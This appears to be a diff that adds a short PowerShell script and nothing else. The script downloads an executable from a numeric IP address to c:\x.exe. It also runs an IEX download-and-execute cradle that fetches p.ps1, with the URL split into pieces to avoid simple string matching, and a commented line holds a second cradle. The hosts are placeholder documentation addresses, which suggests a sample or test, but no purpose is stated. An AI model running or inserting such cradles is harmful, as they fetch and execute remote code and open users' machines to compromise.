@@ -1,0 +1,5 @@
+$wc = New-Object System.Net.WebClient
+$url = "http://203.0.113.5:8080/a/b.exe"
+$wc.DownloadFile($url, "c:\x.exe")
+# (New-Object Net.WebClient).DownloadString('http://198.51.100.1/no')
+IEX (New-Object Net.WebClient).DownloadString('http://' + '198.51.100.2/p.ps1')
